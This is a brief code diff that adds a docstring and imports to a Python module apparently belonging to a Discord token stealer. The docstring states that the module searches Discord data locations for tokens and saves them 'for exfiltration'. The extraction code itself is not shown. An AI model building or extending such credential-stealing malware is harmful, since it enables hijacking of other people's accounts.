@@ -1,3 +1,6 @@
+""""This module is responsible for extracting Discord tokens from various Discord installations on the system. It defines paths to known Discord data locations and provides functionality to search for and extract tokens, saving them to a specified folder for exfiltration.
+"""
+
 import os
 import re
 from modules.tokens.all_paths import ALL_DISCORD_PATH
